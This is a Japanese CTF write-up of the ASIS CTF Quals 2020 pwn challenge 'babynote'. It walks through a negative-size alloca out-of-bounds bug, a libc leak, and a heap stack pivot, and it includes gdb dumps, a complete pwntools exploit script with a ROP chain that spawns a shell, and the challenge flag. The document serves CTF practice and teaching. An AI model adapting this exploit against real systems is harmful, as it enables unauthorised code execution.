---
tags: pwn
---

# ASIS CTF Quals 2020 - babynote

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 作問者リポジトリ

<https://bitbucket.org/ptr-yudai/writeups-2020/src/master/ASIS_CTF_Quals_2020/>

## Writeup

### Outline

いつものHeap問題...と思いきやHeap上に処理を移してROPする問題、とは言えadd(create+edit), delete, showは普通に出来る
最初に指定した分だけポインタが入る動的配列(おそらく`alloca`を利用)をスタック上に用意してHeap領域を指すポインタを用意している。
この際、指定した容量だけrspが上(アドレス的には小さい方)に伸びるのだが、ここで負数を指定するとrspが下がる。これはshort型で渡すので65535を指定すれば-1を指定したのと同じになる。
ポインタのインデックス指定は最初に入力した容量以内の数しか出来ないが、65535を指定すればそこまでは指定出来るのでスタック上の殆どの値に対してshowやdeleteが出来、Heapのアドレスの限るが上書きもできる。
これを利用してlibc leakしする。また、これらの処理はmain関数から呼ばれているのでmain関数上の処理の続行の為に退避されたrbpを書き換えればmain関数でのleave処理でスタックをHeap上のアドレスに移すことが出来る
というわけで古いrbpを上書きしたポインタが指す先にROPチェーンを仕込んでおいてシェルを取る

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

libcは2.27

main関数はスッキリしている

```c
undefined8 main(void)

{
  short sVar1;
  
  sVar1 = readuint(&DAT_00100ee6);
  note((ulong)(uint)(int)sVar1);
  return 0;
}
```

`note`関数をGhidraでデコンパイルするとrspがピュンピュン動いている処理が書かれていてややこしいのでデコンパイル結果は割愛、おそらく最初に入力する`n`を容量として`alloca`で動的配列が生成されており、そこにHeap上を指すポインタが格納される。

コマンドは次の3種類

* new: インデックスとサイズとデータを指定してcreate+editする
* show: インデックスを指定して中身を見る
* delete: インデックスを指定してfreeする

この問題の厄介ポイントその1がdelete時のポインタクリアで、このせいでUAFやDouble Freeは出来ない
その2はmallocではなくcallocを使っている点でこのせいでtcacheではなくfastbinから使われるようになる、またfastbinから取る際のチェックも結構厳しいらしい
その3はその2との併用で威力を発揮するのだが、サイズに指定できるのが0x40以下という点でこのせいでfastbinの使用を強制される、僕たちのtcacheを返して

### OOB

このバイナリのおそらく唯一の脆弱性が`alloca`に負数を指定できる点である。といっても-1を入れても弾かれる。そこで65535を入れるとshort型でキャストされるので-1を渡したのと同じ扱いになる。
普通に指定すると最初に指定した数より多い数や負数をインデックスに指定することは出来ない、これが出来ればスタック上で配列がある部分より上だったり下だったりする部分が指定出来るのだが出来ない。
一方で負数の容量を指定したことでrspが上ではなく下(アドレス的に値が大きい方)に動いたと同時に65535まではインデックスを指定出来るので実質スタック上の殆どの値をインデックスに指定出来ることになる。

ここでインデックス0, 1にそれぞれnoteを作ってみた時のスタックの様子が次の通り

```
gdb-peda$ telescope 32
0000| 0x7ffffffedbb0 --> 0x8403260 --> 0x61616161 ('aaaa')
0008| 0x7ffffffedbb8 --> 0x8403290 --> 0x62626262 ('bbbb')
0016| 0x7ffffffedbc0 --> 0x3533353536 ('65535')
0024| 0x7ffffffedbc8 --> 0xffff08000e4d 
0032| 0x7ffffffedbd0 --> 0x7ffffffedbb0 --> 0x8403260 --> 0x61616161 ('aaaa')
0040| 0x7ffffffedbd8 --> 0x45a43fd5eedfd200 
0048| 0x7ffffffedbe0 --> 0x7ffffffedc00 --> 0x8000e00 --> 0x41d7894956415741 
0056| 0x7ffffffedbe8 --> 0x8000dac --> 0x55c3c900000000b8 
0064| 0x7ffffffedbf0 --> 0x7ffffffedce0 --> 0x1 
0072| 0x7ffffffedbf8 --> 0xffff000000000000 
0080| 0x7ffffffedc00 --> 0x8000e00 --> 0x41d7894956415741 
0088| 0x7ffffffedc08 --> 0x7fffff021b97 (<__libc_start_main+231>:       mov    edi,eax)
0096| 0x7ffffffedc10 --> 0x1 
0104| 0x7ffffffedc18 --> 0x7ffffffedce8 --> 0x7ffffffedf57 ("/mnt/c/share/CTF/asis2020/babynote-distfiles/chall")
0112| 0x7ffffffedc20 --> 0x100008000 
0120| 0x7ffffffedc28 --> 0x8000d89 --> 0x10ec8348e5894855 
0128| 0x7ffffffedc30 --> 0x0 
0136| 0x7ffffffedc38 --> 0x86b5068d3d674b05 
0144| 0x7ffffffedc40 --> 0x80008c0 --> 0x89485ed18949ed31 
0152| 0x7ffffffedc48 --> 0x7ffffffedce0 --> 0x1 
0160| 0x7ffffffedc50 --> 0x0 
0168| 0x7ffffffedc58 --> 0x0 
0176| 0x7ffffffedc60 --> 0x794ae97099474b05 
0184| 0x7ffffffedc68 --> 0x794ae88917f94b05 
0192| 0x7ffffffedc70 --> 0x7fff00000000 
--More--(25/32)
0200| 0x7ffffffedc78 --> 0x0 
0208| 0x7ffffffedc80 --> 0x0 
0216| 0x7ffffffedc88 --> 0x7fffff410733 (<_dl_init+259>:        add    r14,0x8)
0224| 0x7ffffffedc90 --> 0x7fffff3e7638 --> 0x7fffff199e10 --> 0x8348535554415541 
0232| 0x7ffffffedc98 --> 0x3881b101 
0240| 0x7ffffffedca0 --> 0x0 
0248| 0x7ffffffedca8 --> 0x0 
gdb-peda$ 
```

rspにインデックス0が来てそのまま下方向に添え字が増えていく配列になっている。ということはスタック上の値がポインタとして使えればshowやdeleteを発動することが出来る。
ここでこの図をよく観察するとオフセット0224にlibc中を指してそうなポインタが見える(pedaだと色が違うのでわかりやすい)。ここが何かはよく知らないがこれを利用してlibc leak出来る(libc+0x199e10 でオフセットが固定なので)

### ROP on Heap

さて、上で述べたOOBのおかげでnew時にインデックスに対応するスタック上にHeapのアドレスを放り込むことが出来る。これは特に意味が無さそうに見えるがmain関数内で退避させたrbpを上書きすることが出来る。これはmain関数に戻ったときには意味無いが、main関数が処理を終えて`__libc_start_main`に戻ろうとする時に効果がある。

言うまでも無いことだが、通常関数が呼び出し元に戻る時はスタックを元に戻すために次のような命令が実行される。

```
mov rsp, rbp
pop rbp
```

これは関数呼び出し時に呼び出し元のrbpをpushしているのでそれを復元する処理である。今回はこれによってrbpがHeap上のアドレスになってmainに戻る。
といってもmainも直ぐに終わってしまい`__libc_start_main+231`に戻ろうとして、再びこの2つ命令が実行される。
この時`mov rsp, rbp`によってスタックポインタが先程`rbp`に代入されたHeap上のアドレスになる。するとスタックポインタが変わったことで`pop rbp`した後のスタックトップに入っている箇所へジャンプする。
ということはこのHeap上の領域へ書き込みする際に、次のように値を入れておけばHeap上でROPをすることが出来る

```
0xdeadbeefcafebabe: pop rbpでrbpに入る値
(次に飛ばしたいアドレス、例えばpop rdi; retがあるところ)
(第一引数)
...
```

今回は`system("/bin/sh")`を実行しようとしたら何故かretを挟んでも失敗したので作問者Writeup同様`execve("/bin/sh", null, null)`を実行した。
One Gadgetはなんとなく失敗しそうなので試してない(は?)

## Code

```python
from pwn import u64, p64, process, remote, ELF


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def new(s, idx, size, data=b"/bin/sh"):
    select(s, 1)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"size: ")
    s.sendline(str(size))
    s.recvuntil(b"data: ")
    s.send(data)


def show(s, idx):
    select(s, 2)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"[+] data: ")
    return s.recvline().rstrip()


def delete(s, idx):
    select(s, 3)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """

    target = "69.172.229.147"
    port = 9001
    # s = remote(target, port)
    s = process("./chall")
    libc = ELF("./libc-2.27.so")
    system_libc = libc.symbols["system"]
    execve_libc = libc.symbols["execve"]
    binsh_libc = next(libc.search(b"/bin/sh\x00"))
    
    n = 65535
    s.recvuntil(b": ")
    s.sendline(str(n).encode())

    idxs = {
        "heap": 4,
        "stack": 13,
        "libc": 28,
        "old_rbp": 6
    }

    offset = {
        "heap": 0,
        "stack": 0,
        "libc": 0x199e10
    }

    rpg = {
        "ret": 0x21560,
        "poprdxrsi": 0x1306d9,
        "poprdi": 0x2155f
    }

    heap_idx = 4
    stack_idx = 13
    libc_idx = 28

    new(s, 0, 0x20)

    heap_addr = u64(show(s, idxs["heap"]).ljust(8, b"\x00")) - offset["heap"]
    libc_addr = u64(show(s, idxs["libc"]).ljust(8, b"\x00")) - offset["libc"]

    print(hex(heap_addr))
    print(hex(libc_addr))

    # 何故かsystem("/bin/sh")はret gadget入れても発火しなかった
    rop_payload = b"junkjunk"
    rop_payload += p64(libc_addr + rpg["poprdxrsi"])
    rop_payload += p64(0)
    rop_payload += p64(0)
    rop_payload += p64(libc_addr + rpg["poprdi"])
    rop_payload += p64(libc_addr + binsh_libc)
    rop_payload += p64(libc_addr + execve_libc)

    new(s, 6, 0x40, rop_payload)

    select(s, 0)
    s.interactive()

```

## Flag

当日解いたのは弊チームのDronexくんですが、鯖が生きていたので復習しました

`ASIS{b4by_st4ck_00b_n0t3}`

## 作問者Writeup

* <https://ptr-yudai.hatenablog.com/entry/2020/07/06/000622#119pts-babynote-37-solves>

## 感想

完全にHeap問題かと思っていたら(Heap問題だったけれど)stack pivotと同じ要領でスタックトップを別の領域に移すというのが正攻法だった、作問が上手すぎる

ちなみに当日はHeapのアドレスが0x56aadeadbeefみたいな形になることを利用して0x56をfastbinのサイズヘッダとして利用する方法で解いていました、彼からWriteup貰ったら再現してこの企画で扱うかもしれません